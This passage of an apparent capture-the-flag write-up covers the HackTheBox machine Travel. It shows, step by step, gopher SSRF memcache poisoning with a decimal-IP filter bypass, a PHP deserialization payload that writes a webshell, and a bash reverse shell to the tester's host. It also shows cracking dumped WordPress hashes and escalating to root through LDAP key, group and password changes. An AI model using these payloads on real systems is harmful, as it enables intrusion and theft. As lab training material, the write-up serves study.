  -h, --help         show this help message and exit
  --exploit EXPLOIT  mysql, fastcgi, redis, smtp, zabbix, pymemcache,
                     rbmemcache, phpmemcache, dmpmemcache
None

```

I’ll run it with `--exploit phpmemcache` and give it a test payload:

```

root@kali# gopherus --exploit phpmemcache

  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$

This is usable when you know Class and Variable name used by user

Give serialization payload
example: O:5:"Hello":0:{}   : test payload

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%2012%0d%0atest%20payload%0d%0a

After everything done, you can delete memcached item by using this payload: 

gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a
-----------Made-by-SpyD3r-----------

```

What comes out looks just like what I played with above. If I decode what comes after `/_`, its:

```

set SpyD3r 4 0 12
test payload

```

That’s memcache to set a key “SpyD3r” with metadata of 4, expiry time of 0, and length of payload 12. Then the next line puts in those twelve bytes, ending with `\r\n`.

### Bypass Hacker Checks

I tried to submit the payload out of Gopherus using:

```

curl -s 'http://blog.travel.htb/awesome-rss/?custom_feed_url&url=gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%2012%0d%0atest%20payload%0d%0a'

```

Because I was lazily grepping for `^|`  to get the debug output, it took me a few minutes to figure out why I was getting none. I eventually paste it into Firefox:

![image-20200521071602174](https://0xdfimages.gitlab.io/img/image-20200521071602174.png)

In `template.php`, this check is matching:

```

$tmp = parse_url($url, PHP_URL_HOST);
// preventing all localhost access
if($tmp == "localhost" or $tmp == "127.0.0.1")
{               
        die("<h2>Hacking attempt prevented (Internal SSRF). Event has been logged.</h2>");              
}

```

At first I tried a few things that I found in [this Blackhat presentation by Orange Tsai](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf) (that guy seems to turn up everywhere), but couldn’t get any to work. The I remembered a Tweet that went round a couple months ago (I couldn’t find it again) showing how IP addresses in URLs can be put in a lot of different ways. PayloadsAllTheThings has a [page for this](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypassing-filters). It seems like the decimal IP would work here, so I replaced `127.0.0.1` with `2130706433`.

Now I can run that curl, and there’s no Hacking message. Even with `debug` in the message, it doesn’t print the debug info, likely because the weird url doesn’t load a feed. But if immediately after I run the default url with `debug`, I can see I’ve put data into memcache:

```

root@kali# curl -s 'http://blog.travel.htb/awesome-rss/?custom_feed_url&url=gopher://2130706433:11211/_%0d%0aset%20SpyD3r%204%200%2012%0d%0atest%20payload%0d%0a' | grep 'Hacking'
root@kali# curl -s 'http://blog.travel.htb/awesome-rss/?debug' | grep '^| '
| SpyD3r | test payload |

```

### Weaponize Payload

There’s two changes I need to make here to get my payload working. First, I need to target a memcache name to something I can legitimately trigger later. I could have it use the default feed location, but I’d prefer to make it one others won’t stomp on. I [showed earlier](#weaponize-payload) that the url `http://10.10.14.47/customfeed.xml` resulted in a memcache location of `xct_33b3801533e6b205005605117e9b685d`, so I’ll use that. In the `curl` above, I’ll replace `SpyD3r`and it works:

```

root@kali# curl -s 'http://blog.travel.htb/awesome-rss/?custom_feed_url&url=gopher://2130706433:11211/_%0d%0aset%20xct_33b3801533e6b205005605117e9b685d%204%200%2012%0d%0atest%20payload%0d%0a' | grep 'Hacking'
root@kali# curl -s 'http://blog.travel.htb/awesome-rss/?debug' | grep '^| '
| xct_33b3801533(...) | test payload |

```

Next I’ll replace “test payload” with the payload I [created earlier](#weaponize-payload). I could do this manually, by encoding the payload, getting the length, and putting both of those into the right places, but there’s too much room for error. So I used `gopherus` again with the new payload, and remembered to change 127.0.0.1 to 2130706433 and the name to get the following url:

```

gopher://2130706433:11211/_%0d%0aset%20xct_33b3801533e6b205005605117e9b685d%204%200%20101%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:8:%220xdf.php%22%3Bs:4:%22data%22%3Bs:30:%22%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a

```

### Execute

#### Upload

I’ll `curl` to poison memcache, and it works:

```

root@kali# curl -s 'http://blog.travel.htb/awesome-rss/?custom_feed_url&url=gopher://2130706433:11211/_%0d%0aset%20xct_33b3801533e6b205005605117e9b685d%204%200%20101%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:8:%220xdf.php%22%3Bs:4:%22data%22%3Bs:30:%22%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a' | grep 'Hacking'
root@kali# curl -s 'http://blog.travel.htb/awesome-rss/?debug' | grep '^| '
| xct_33b3801533(...) | O:14:"TemplateHelper":2:{s:4:"file(...) |

```

Now to trigger it, I need to get SimplePie to try to access the url associated with that key. So I’ll request it:

```

root@kali# curl -s 'http://blog.travel.htb/awesome-rss/?custom_feed_url&url=http://10.10.14.47/customfeed.xml' > /dev/null

```

If things worked, the webshell should be written.

#### Find Webshell

The PHP writes the file to `__DIR__.'/logs/'.$this->file`. The install instructions included the line “copy rss\_template.php & template.php to `wp-content/themes/twentytwenty`”. So the logs directory should be at `http://blog.travel.htb/wp-content/themes/twentytwenty/logs/`. Visiting gives a 403, which is a good sign it’s there:

![image-20200521082904254](https://0xdfimages.gitlab.io/img/image-20200521082904254.png)

If I go to `0xdf.php?cmd=id`, I’ve got RCE:

```

root@kali# curl -s http://blog.travel.htb/wp-content/themes/twentytwenty/logs/0xdf.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

#### Shell

To get a shell, I’ll hit the shell with `curl` and a reverse shell:

```

root@kali# curl -G 'http://blog.travel.htb/wp-content/themes/twentytwenty/logs/0xdf.php' --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.47/443 0>&1'"

```

In a listening `nc`:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.189.
Ncat: Connection from 10.10.10.189:34800.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@blog:/var/www/html/wp-content/themes/twentytwenty/logs$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

## Shell as lynik-admin@travel

### Enumeration

The host I landed is in clearly a container:

```

www-data@blog:/$ ls -la .dockerenv 
-rwxr-xr-x 1 root root 0 Apr 23 18:44 .dockerenv
www-data@blog:/$ hostname 
blog
www-data@blog:/$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
16: eth0@if17: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:1e:00:0a brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.30.0.10/24 brd 172.30.0.255 scope global eth0
       valid_lft forever preferred_lft forever

```

It has no interactive users other than root. It is listening on 80 (the website), and memcache, mysql, and something unknown are listening on localhost:

```

www-data@blog:/$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.11:41153        0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -  

```

The DB connection info is in `/var/www/html/wp-config.php`:

```

...[snip]...
// ** MySQL settings - You can get this info from your web host ** // 
/** The name of the database for WordPress */
define( 'DB_NAME', 'wp' );  

/** MySQL database username */                   
define( 'DB_USER', 'wp' );
                                                                   
/** MySQL database password */ 
define( 'DB_PASSWORD', 'fiFtDDV9LYe8Ti' ); 
                                                                   
/** MySQL hostname */
define( 'DB_HOST', '127.0.0.1' );
...[snip]...

```

In the database I’ll dump both the WordPress hashes and the MySQL hashes:

```

www-data@blog:/$ mysql -u wp -pfiFtDDV9LYe8Ti wp   
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 30493
Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [wp]> show tables;
+-----------------------+
| Tables_in_wp          |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.000 sec)

MariaDB [wp]> select * from wp_users;
+----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email       | user_url         | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/ | admin         | admin@travel.htb | http://localhost | 2020-04-13 13:19:01 |                     |           0 | admin        |
+----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+
1 row in set (0.000 sec)
MariaDB [wp]> use mysql
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A
Database changed
MariaDB [mysql]> select host,user,password from user;
+-----------+------+-------------------------------------------+
| host      | user | password                                  |
+-----------+------+-------------------------------------------+
| localhost | root | *1B60CF2952D5498B80A1FCB3E6DACA506461CCED |
| localhost | wp   | *78FC42823E305392882F5BAAF99BB381F989010C |
+-----------+------+-------------------------------------------+
2 rows in set (0.000 sec)

```

I tossed all three of those into `hashcat`, but none broke on rockyou. However, there’s a backup of the database in `/opt/wordpress`:

```

www-data@blog:/opt/wordpress$ ls
backup-13-04-2020.sql

```

At the very bottom, there’s the data for the `wp.users` table:

```

LOCK TABLES `wp_users` WRITE;
/*!40000 ALTER TABLE `wp_users` DISABLE KEYS */;
INSERT INTO `wp_users` VALUES (1,'admin','$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/','admin','admin@travel.htb','http://localhost','2020-04-13 13:19:01','',0,'admin'),(2,'lynik-admin','$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.','lynik-admin','lynik@travel.htb','','2020-04-13 13:36:18','',0,'Lynik Schmidt');
/*!40000 ALTER TABLE `wp_users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

```

There’s a second user in there for a user, lynik-admin!

### Crack Hash

With that in a file, I’ll start `hashcat` again, and the one from the backup cracks:

```

root@kali# hashcat -m 400 wp_hashes /usr/share/wordlists/rockyou.txt --force
...[snip]...
$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.:1stepcloser   
...[snip]...

```

### SSH

After trying to `su` to root in the container and failing, I tried the username and password over SSH, and got a shell on Travel:

```

root@kali# sshpass -p 1stepcloser ssh lynik-admin@10.10.10.189
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)

  System information as of Thu 21 May 2020 08:50:09 PM UTC

  System load:                      0.0
  Usage of /:                       46.1% of 15.68GB
  Memory usage:                     16%
  Swap usage:                       0%
  Processes:                        214
  Users logged in:                  0
  IPv4 address for br-836575a2ebbb: 172.20.0.1
  IPv4 address for br-8ec6dcae5ba1: 172.30.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.10.189

Last login: Thu May 21 20:36:20 2020 from 10.10.14.47
lynik-admin@travel:~$

```

From there, I had `user.txt`:

```

lynik-admin@travel:~$ cat user.txt
dc6e97c8************************

```

## Shell as root@travel

### Enumeration

#### General

Looking around the box, the first thing I noticed was an interesting directory in the system root. In addition to `/home`, there was `/home@TRAVEL`. It was empty.

Looking further, there were two things in lynik-admin’s home directory:

```

lynik-admin@travel:~$ ls -la
total 40
drwx------ 3 lynik-admin lynik-admin 4096 May 22 20:21 .
drwxr-xr-x 4 root        root        4096 Apr 23 17:31 ..
lrwxrwxrwx 1 lynik-admin lynik-admin    9 Apr 23 17:31 .bash_history -> /dev/null
-rw-r--r-- 1 lynik-admin lynik-admin  220 Feb 25 12:03 .bash_logout
-rw-r--r-- 1 lynik-admin lynik-admin 3771 Feb 25 12:03 .bashrc
drwx------ 2 lynik-admin lynik-admin 4096 Apr 23 19:34 .cache
-rw-r--r-- 1 lynik-admin lynik-admin   82 Apr 23 19:35 .ldaprc
-rw------- 1 lynik-admin lynik-admin   36 May 22 20:05 .lesshst
-rw-r--r-- 1 lynik-admin lynik-admin  807 Feb 25 12:03 .profile
-r--r--r-- 1 root        root          33 May 22 13:49 user.txt
-rw------- 1 lynik-admin lynik-admin  861 Apr 23 19:35 .viminfo

```

First, there’s a `.ldaprc` file. This is a file that defines how a user connects to LDAP:

```

HOST ldap.travel.htb
BASE dc=travel,dc=htb
BINDDN cn=lynik-admin,dc=travel,dc=htb

```

Next, there’s a `.viminfo` file. This file is often on machines, and it’s a good idea to check what’s in there, as `vim` will often store stuff that was deleted from a file:

```

# This viminfo file was generated by Vim 8.1.
# You may edit it if you're careful!

# Viminfo version
|1,4

# Value of 'encoding' when this file was written
*encoding=utf-8

# hlsearch on (H) or off (h):
~h
# Command Line History (newest to oldest):
:wq!
|2,0,1587670530,,"wq!"

# Search String History (newest to oldest):

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Debug Line History (newest to oldest):

# Registers:
""1     LINE    0
        BINDPW Theroadlesstraveled
|3,1,1,1,1,0,1587670528,"BINDPW Theroadlesstraveled"

# File marks:
'0  3  0  ~/.ldaprc
|4,48,3,0,1587670530,"~/.ldaprc"

# Jumplist (newest first):
-'  3  0  ~/.ldaprc
|4,39,3,0,1587670530,"~/.ldaprc"
-'  1  0  ~/.ldaprc
|4,39,1,0,1587670527,"~/.ldaprc"

# History of marks within files (newest to oldest):

> ~/.ldaprc
        *       1587670529    0
        "       3       0
        .       4       0
        +       4       0

```

This one does just that. There’s a `BINDPW`, “Theroadlesstraveled”. That’s no longer in the `.ldaprc` file, so it must have been removed.

#### LDAP Enumeration

I can use this information to connect to the LDAP and dump information. There’s a ton, so I’ll just put portions here:

```

# extended LDIF
#
# LDAPv3
# base <dc=travel,dc=htb> (default) with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# travel.htb
dn: dc=travel,dc=htb
objectClass: top
objectClass: dcObject
objectClass: organization
o: Travel.HTB
dc: travel

# admin, travel.htb
dn: cn=admin,dc=travel,dc=htb
objectClass: simpleSecurityObject
objectClass: organizationalRole
cn: admin
description: LDAP administrator

# servers, travel.htb
dn: ou=servers,dc=travel,dc=htb
description: Servers
objectClass: organizationalUnit
ou: servers

# lynik-admin, travel.htb
dn: cn=lynik-admin,dc=travel,dc=htb
description: LDAP administrator
objectClass: simpleSecurityObject
objectClass: organizationalRole
cn: lynik-admin
userPassword:: e1NTSEF9MEpaelF3blZJNEZrcXRUa3pRWUxVY3ZkN1NwRjFRYkRjVFJta3c9PQ==

# workstations, travel.htb
dn: ou=workstations,dc=travel,dc=htb
description: Workstations
objectClass: organizationalUnit
ou: workstations

...[snip]...

```

So what’s interesting in here? First, I see my current user:

```

# lynik-admin, travel.htb
dn: cn=lynik-admin,dc=travel,dc=htb
description: LDAP administrator
objectClass: simpleSecurityObject
objectClass: organizationalRole
cn: lynik-admin
userPassword:: e1NTSEF9MEpaelF3blZJNEZrcXRUa3pRWUxVY3ZkN1NwRjFRYkRjVFJta3c9PQ==

```

lynik-admin is the LDAP administrator. That’s interesting. The `userPassword` field is not helpful, just a hash.

I see a handful of other users, that more or less look the same:

```

# christopher, users, linux, servers, travel.htb
dn: uid=christopher,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
uid: christopher
uidNumber: 5003
homeDirectory: /home/christopher
givenName: Christopher
gidNumber: 5000
sn: Ward
cn: Christopher Ward
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
loginShell: /bin/bash

```

#### SSHd Configuration

If I look at the `sshd_config` file (`grep` to just get uncommented lines), I see something important:

```

lynik-admin@travel:~$ cat /etc/ssh/sshd_config | grep -v '^#' | grep . 
Include /etc/ssh/sshd_config.d/*.conf
AuthorizedKeysCommand /usr/bin/sss_ssh_authorizedkeys
AuthorizedKeysCommandUser nobody
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem sftp  /usr/lib/openssh/sftp-server
PasswordAuthentication no
Match User trvl-admin,lynik-admin
        PasswordAuthentication yes

```

`AuthorizedKeysCommand` is something I dealt with in [Ypuffy](/2019/02/09/htb-ypuffy.html#enumerating-the-ca). This is a command that’s run to get a public key for a user when the public key is provided by some service rather than in a file on the local host.

I can run it now, but it fails to get a key for any user:

```

lynik-admin@travel:~$ /usr/bin/sss_ssh_authorizedkeys jane

```

The config also bans password authentication for everyone but trvl-admin and lynik-admin.

### Modify User

I’m going to pick a user from the list in LDAP to mess with. First, I’m going to add an SSH key to their profile. To do this, I’ll need to create a LDIF file. It’s very finicky about the format, and I used a ton of different references ([1](https://www.digitalocean.com/community/tutorials/how-to-use-ldif-files-to-make-changes-to-an-openldap-system) [2](https://simp.readthedocs.io/en/master/user_guide/User_Management/LDAP.html) [3](https://www.openldap.org/lists/openldap-software/200408/msg00358.html) [4](http://pig.made-it.com/ldap-openssh.html)) and a lot of trial and error to get this working.

One other thing to note - there’s something cleaning up the LDAP modifications I made very regularly, so if I change something, go research, and then come back, I may need to redo that first thing as well.

#### Add Public Key

I’ll create a file to add a key I made to johnny and save it as `/dev/shm/add_ssh_to_johnny.ldif`:

```

dn: uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
changeType: modify
add: objectClass
objectClass: ldapPublicKey
-
add: sshPublicKey
sshPublicKey: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDuvHabP2Cb9+Y+psec9TVEpcFufsrx+E+mcpIhFgRyAcoEMU7gmeFxonOcANJ/DCNgv3FJEYMETfdvqW3AU8vJDPFpBkzywCMCVdn8xFAQZBt2FgdVwhTA1F05bjyx+CKh8aw6iuVJhVJ3TtbcEoGsWVXfXS1nWO+uSFIDTZNNUURZRyORJdQ7JH0wwKX42htJkyIeT+Rf+OOFbOcfkfmFbNoOVvk+zm5GZxZgiAyHTeTX8xT5i16Skm4VRCLy4tmDB7Ze80egJxbQHfjRKuFOHitbz2ls6KoYWWCsugbiADjizmYlrIGqlpadenNZhL3W+HVac9CvTuDj6lxLnswpzGVj/D69DGxq0zo9ZIa9iLK9zjkyWHWxVOPuvPAxTSFrcDStPrgws95IzVTlM5ogOp0LZodGsp7hr/+03mrIBf/UIYcPgyO5Mqbo2jvtklo9ZyI2kpu+5D7FFS7YRbvLYOYvpRyGHUfpnUSEtKLRCg0ofcsoKYYPJqzrilFcPK8= root@kali

```

Now I’ll use `ldapadd` to push the change:

```

lynik-admin@travel:~$ ldapadd -D "cn=lynik-admin,dc=travel,dc=htb" -w Theroadlesstraveled -f /dev/shm/add_ssh_to_johnny.ldif 
modifying entry "uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb"

```

Now I can see that the key comes back:

```

lynik-admin@travel:~$ /usr/bin/sss_ssh_authorizedkeys johnny
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDuvHabP2Cb9+Y+psec9TVEpcFufsrx+E+mcpIhFgRyAcoEMU7gmeFxonOcANJ/DCNgv3FJEYMETfdvqW3AU8vJDPFpBkzywCMCVdn8xFAQZBt2FgdVwhTA1F05bjyx+CKh8aw6iuVJhVJ3TtbcEoGsWVXfXS1nWO+uSFIDTZNNUURZRyORJdQ7JH0wwKX42htJkyIeT+Rf+OOFbOcfkfmFbNoOVvk+zm5GZxZgiAyHTeTX8xT5i16Skm4VRCLy4tmDB7Ze80egJxbQHfjRKuFOHitbz2ls6KoYWWCsugbiADjizmYlrIGqlpadenNZhL3W+HVac9CvTuDj6lxLnswpzGVj/D69DGxq0zo9ZIa9iLK9zjkyWHWxVOPuvPAxTSFrcDStPrgws95IzVTlM5ogOp0LZodGsp7hr/+03mrIBf/UIYcPgyO5Mqbo2jvtklo9ZyI2kpu+5D7FFS7YRbvLYOYvpRyGHUfpnUSEtKLRCg0ofcsoKYYPJqzrilFcPK8= root@kali

```

I can also connect using the private side of that key:

```

root@kali# ssh -i ~/keys/gen johnny@10.10.10.189
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)

  System information as of Fri 22 May 2020 08:29:15 PM UTC

  System load:                      0.01
  Usage of /:                       46.0% of 15.68GB
  Memory usage:                     14%
  Swap usage:                       0%
  Processes:                        209
  Users logged in:                  1
  IPv4 address for br-836575a2ebbb: 172.20.0.1
  IPv4 address for br-8ec6dcae5ba1: 172.30.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.10.189

Last login: Fri May 22 20:21:39 2020 from 10.10.14.47
johnny@travel:~$

```

johnny’s home directory is `/home@TRAVEL/johnny`.

#### Change Group

Having a shell as johnny doesn’t gain me much in the current status. But, there are other things I can change over remote LDAP, like the user’s group. I first tried to change it to 0, or root, but that didn’t take (I’ll show that config in [Beyond Root](#sssd)). But then I realized there’s a group just as good - `sudo`. I looked in `/etc/group` to see it’s gid 27:

```

lynik-admin@travel:~$ grep sudo /etc/group 
sudo:x:27:trvl-admin

```

Then I created `change_johnny_to_sudo.ldif`:

```

dn: uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
changeType: modify
replace: gidNumber
gidNumber: 27

```

Before I add this to LDAP, I can use `getent passwd` to see the LDAP version of the `/etc/passwd` file. I’ll just grep on johnny for example:

```

lynik-admin@travel:~$ getent passwd | grep johnny
johnny:*:5004:5000:Johnny Miller:/home@TRAVEL/johnny:/bin/bash 

```

Now I’ll run the `.ldif` with `ldapadd`:

```

lynik-admin@travel:~$ ldapadd -D "cn=lynik-admin,dc=travel,dc=htb" -w Theroadlesstraveled -f /dev/shm/change_johnny_to_sudo.ldif       
modifying entry "uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb"

```

If I check the passwd again, now johnny is group 27:

```

lynik-admin@travel:~$ getent passwd | grep johnny
johnny:*:5004:27:Johnny Miller:/home@TRAVEL/johnny:/bin/bash

```

I can SSH to the box, and the group is there:

```

root@kali# ssh -i ~/keys/gen johnny@10.10.10.189
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)

  System information as of Fri 22 May 2020 09:09:05 PM UTC

  System load:                      0.02
  Usage of /:                       46.0% of 15.68GB
  Memory usage:                     14%
  Swap usage:                       0%
  Processes:                        204
  Users logged in:                  2
  IPv4 address for br-836575a2ebbb: 172.20.0.1
  IPv4 address for br-8ec6dcae5ba1: 172.30.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.10.189

Last login: Fri May 22 20:35:39 2020 from 10.10.14.47
johnny@travel:~$ id
uid=5004(johnny) gid=27(sudo) groups=27(sudo),5000(domainusers)

```

But when I run `sudo`, it asks for a password, which I don’t know:

```

johnny@travel:~$ sudo su -
[sudo] password for johnny:

```

#### Add Password

One last LDAP mod - add a password for johnny. Another `.ldif` file:

```

dn: uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
changeType: modify
replace: userPassword
userPassword: 0xdf

```

Run it:

```

lynik-admin@travel:~$ ldapadd -D "cn=lynik-admin,dc=travel,dc=htb" -w Theroadlesstraveled -f /dev/shm/add_johnny_pass.ldif 
modifying entry "uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb"

```

Wait a few seconds for it to add to the system, and then SSH in, `sudo`, and I’m root:

```

root@kali# ssh -i ~/keys/gen johnny@10.10.10.189
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)

  System information as of Fri 22 May 2020 09:11:33 PM UTC

  System load:                      0.0
  Usage of /:                       46.0% of 15.68GB
  Memory usage:                     14%
  Swap usage:                       0%
  Processes:                        215
  Users logged in:                  2
  IPv4 address for br-836575a2ebbb: 172.20.0.1
  IPv4 address for br-8ec6dcae5ba1: 172.30.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.10.189

Last login: Fri May 22 21:09:05 2020 from 10.10.14.47
johnny@travel:~$ sudo su -
[sudo] password for johnny: 
root@travel:~#

```

And grab `root.txt`:

```

root@travel:~# cat root.txt
c8c6f05f************************

```

#### All in One

I did figure out how to get all three changes into on `.ldif` file:

```

dn: uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
changeType: modify
replace: gidNumber
gidNumber: 27
-
replace: userPassword
userPassword: 0xdf
-
add: objectClass
objectClass: ldapPublicKey
-
add: sshPublicKey
sshPublicKey: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDuvHabP2Cb9+Y+psec9TVEpcFufsrx+E+mcpIhFgRyAcoEMU7gmeFxonOcANJ/DCNgv3FJEYMETfdvqW3AU8vJDPFpBkzywCMCVdn8xFAQZBt2FgdVwhTA1F05bjyx+CKh8aw6iuVJhVJ3TtbcEoGsWVXfXS1nWO+uSFIDTZNNUURZRyORJdQ7JH0wwKX42htJkyIeT+Rf+OOFbOcfkfmFbNoOVvk+zm5GZxZgiAyHTeTX8xT5i16Skm4VRCLy4tmDB7Ze80egJxbQHfjRKuFOHitbz2ls6KoYWWCsugbiADjizmYlrIGqlpadenNZhL3W+HVac9CvTuDj6lxLnswpzGVj/D69DGxq0zo9ZIa9iLK9zjkyWHWxVOPuvPAxTSFrcDStPrgws95IzVTlM5ogOp0LZodGsp7hr/+03mrIBf/UIYcPgyO5Mqbo2jvtklo9ZyI2kpu+5D7FFS7YRbvLYOYvpRyGHUfpnUSEtKLRCg0ofcsoKYYPJqzrilFcPK8= root@kali

```

Also, instead of `sudo`, I could have done `docker` or `disk` (or probably other groups) as well.

## Beyond Root

### RSS Exploration

I noticed something weird when I was playing with the RSS feed at the beginning. When I would hit the rss feed with one `curl`:

```

root@kali# curl -s 'http://blog.travel.htb/awesome-rss/?debug&custom_feed_url&url=http://10.10.14.47/customfeed.xml' > /dev/null

```

It would try twice to get the feed:

```
10.10.10.189 - - [20/May/2020 16:47:29] "GET /customfeed.xml HTTP/1.1" 200 -
10.10.10.189 - - [20/May/2020 16:47:29] "GET /customfeed.xml HTTP/1.1" 200 -

```

In the `init()` [function for SimplePie](https://github.com/WordPress/WordPress/blob/master/wp-includes/class-simplepie.php#L1393), it first checks if there’s no url or raw data, in which case it returns false. Then, if there’s a url, it tries to fetch the data:

```

if ($this->feed_url !== null)
{
    $parsed_feed_url = $this->registry->call('Misc', 'parse_url', array($this->feed_url));

    // Decide whether to enable caching
    if ($this->cache && $parsed_feed_url['scheme'] !== '')
    {
        $url = $this->feed_url . ($this->force_feed ? '#force_feed' : '');
        $cache = $this->registry->call('Cache', 'get_handler', array($this->cache_location, call_user_func($this->cache_name_function, $url), 'spc'));
    }

    // Fetch the data via SimplePie_File into $this->raw_data
    if (($fetched = $this->fetch_data($cache)) === true)
    {
        return true;
    }
    elseif ($fetched === false) {
        return false;
    }

    list($headers, $sniffed) = $fetched;
}

```

So only if there’s data and no url would it continue without making the request. I guess that’s why in the code this line is commented out:

```

//$simplepie->set_raw_data($data);

```

The PHP would have to not set the url and set this data to make it work. But then the caching would be weird. Or they could have just let SimplePie make the request, but I suspect it’s not vulnerable to the SSRF I needed to poison memcache.

### sssd

I was curious why I couldn’t use LDAP to add a user to the root group, or change the ssh key for the root user. It turns out that it’s blocked in the config, `/etc/sssd/sssd.conf`, in the second section, `nss`:

```

root@travel:/etc/sssd# cat sssd.conf 
[sssd]
config_file_version = 2
#services = nss,pam,ssh
domains = TRAVEL

[nss]
filter_users = root
filter_groups = root
enum_cache_timeout = 1
memcache_timeout = 0

[pam]

[domain/TRAVEL]
use_fully_qualified_names = False
override_homedir = /home@TRAVEL/%u
enumerate = True
ignore_group_members = False
id_provider = ldap
auth_provider = ldap
ldap_uri = ldap://ldap.travel.htb
cache_credentials = False
ldap_enumeration_refresh_timeout = 3
ldap_id_use_start_tls = true
ldap_tls_reqcert = allow
ldap_default_bind_dn = cn=admin,dc=travel,dc=htb
